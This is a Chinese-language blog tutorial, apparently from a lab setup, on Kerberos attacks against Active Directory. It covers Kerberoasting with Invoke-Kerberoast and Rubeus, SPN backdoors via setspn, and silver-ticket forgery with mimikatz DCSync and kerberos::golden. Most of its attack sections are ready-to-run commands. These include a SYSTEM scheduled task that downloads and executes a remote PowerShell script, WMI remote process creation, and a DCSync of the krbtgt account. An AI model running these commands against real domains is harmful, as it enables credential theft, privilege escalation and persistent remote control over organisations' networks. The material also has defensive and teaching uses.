## Pass The Ticket

Kerbreos 除了第一步AS_ERQ是使用时间戳加密用户hash验证之外，其他的步骤的验证都是通过票据，这个票据 可以是TGT票据或者TGS票据。因为票据里面的内容主要是session_key和ticket(使用服务hash加密的，服务包括krbtgt)，拿到票据之后。我们就可以用这个票据来作为下阶段的验证了。

这个问题会新开一篇文章来讲

## kerberosting

和AS-REP Roasting很像，但是位于不同的阶段,爆破的位置也不同.AS_REP Roasting通过爆破最外层的enc_part来获取用户的明文。

TGS_REP里面ticket里的enc_part是使用服务的hash进行加密的，所以我们可以通过爆破获得服务的明文。

![kerberosting](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/kerberosting.png)

我们需要爆破的是ticket中的enc_part,这里直接使用工具来提取enc_part

自动实现工具，不需要mimikatz,普通用户权限即可

https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921

提取出高权限用户的ID

```powershell
Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
```

![ps](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/ps.png)

我这里没有高权限的账户，只有一个hacker的服务账户

将得到的hash值丢去hashcat进行破解，有概率得到明文密码

同样的可以使用Rubeus进行抓取

```
Rubeus.exe kerberoast
```

### 如何扩大攻击

扩大攻击在于获取到高权限的SPN用户，注册一个SPN需要`Read servicePrincipalName` 和 `Write serverPrincipalName` 的权限，我们能够在域内查询到拥有这两个权限的服务账户并获取其权限，就能手动为高权限用户添加SPN，从而得到高权限用户的TGS票据用于爆破或建立后门

+ 后门利用

  获取SPN权限后，为指定域用户添加一个SPN

  ```
  setspn.exe -U -A VNC/DC.hack.com Administrator
  ```

  这样在域内的任意一台机器上都能获得该SPN,并拿到TGS票据

  删除SPN操作

  ```
  setspn.exe -D VNC/DC.hack.com Administrator
  ```

**问：为什么不尝试获取krbtgt的明文**

krbtgt的密码是随机的

## 白银票据

白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名。

多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC

TGS是伪造的，所以没有和TGT通信，意味着DC从验证过

**制作白银票据的条件**

```shell
1.域名称
2.域的SID值
3.域中的Server服务器账户的NTLM-Hash
4.伪造的用户名，可以是任意用户名.
5.目标服务器上面的kerberos服务
```

**白银票据的服务列表**

```shell
服务名称                    同时需要的服务
WMI                        HOST、RPCSS
PowerShell Remoting        HOST、HTTP
WinRM                    HOST、HTTP
Scheduled Tasks            HOST
Windows File Share        CIFS
LDAP                    LDAP
Windows Remote Server    RPCSS、LDAP、CIFS
```

**利用流程**

1.获取服务hash , sid等信息

```
mimikatz.exe
privilege::debug
lsadump::dcsync /domain:hack.com /user:DC$
```

这里以域控举例，获取到域控的hash和sid

```shell
ntlm: 9bd77ae433b8d7d9b37c6bec828f3ef4
sid: S-1-5-21-754643614-3937478331-2139222398 #不需要末尾的用户标识
```

2.伪造白银票据

```shell
kerberos::golden /domain:hack.com /sid:S-1-5-21-754643614-3937478331-2139222398 /target:DC.hack.com /service:cifs /rc4:9bd77ae433b8d7d9b37c6bec828f3ef4 /user:silver /ptt
```

参数说明

```
/domain：当前域名称
/sid：SID值，和金票一样取前面一部分
/target：目标主机，这里是DC.hack.com
/service：服务名称，这里需要访问共享文件，所以是cifs
/rc4：目标主机的HASH值
/user：伪造的用户名
/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入
```

![silver](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/silver.png)

成功创建并导入，在当前主机上输入klist即可查看到让导入的票据

![klist](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/klist.png)

导入票据之后，就能够访问DC的共享文件夹，这是因为我们创建的时cifs服务的银票

### 其他服务的白银票据

**伪造WSMAN和HTTP的Silver Ticket进行powershell远程执行**

从Windows Server 2008开始，WinRM服务自动启动，但是不开启监听，使用`winrm quickconfig`进行配置后，将打开HTTP和HTTPS监听端口。

使用mimikatz生成两个服务的银票

```
kerberos::golden /domain:hack.com /sid:S-1-5-21-754643614-3937478331-2139222398 /target:DC.hack.com /service:wsman /rc4:9bd77ae433b8d7d9b37c6bec828f3ef4 /user:hacker /ptt
kerberos::golden /domain:hack.com /sid:S-1-5-21-754643614-3937478331-2139222398 /target:DC.hack.com /service:HTTP /rc4:9bd77ae433b8d7d9b37c6bec828f3ef4 /user:hacker /ptt
```

注入两张[HTTP](https://adsecurity.org/?page_id=183)＆[WSMAN](https://adsecurity.org/?page_id=183)白银票据后，我们可以使用PowerShell远程（或WinRM的）反弹出目标系统shell。首先New-PSSession使用PowerShell创建到远程系统的会话的PowerShell cmdlet，然后Enter-PSSession打开远程shell。

```shell
New-PSSession -Name PSC -ComputerName DC; Enter-PSSession -Name PSC
```

**获取HOST服务权限创建计划任务**

创建HOST服务的银票

```
kerberos::golden /domain:hack.com /sid:S-1-5-21-754643614-3937478331-2139222398 /target:DC.hack.com /service:HOST /rc4:9bd77ae433b8d7d9b37c6bec828f3ef4 /user:hacker /ptt
```

创建计划任务

```shell
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

**伪造`ldap`的 Silver Ticket 访问目标计算机的LDAP 服务**

```
kerberos::golden /domain:0day.org /sid:S-1-5-21-754643614-3937478331-2139222398 /target:DC /rc4:9bd77ae433b8d7d9b37c6bec828f3ef4 /service:LDAP /user:administrator /ptt

lsadump::dcsync /dc:OWA2010SP3 /domain:hack.com /user:krbtgt
```

**HOST + RPCSS**

```shell
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

## 委派攻击

会开一篇新的详细讲

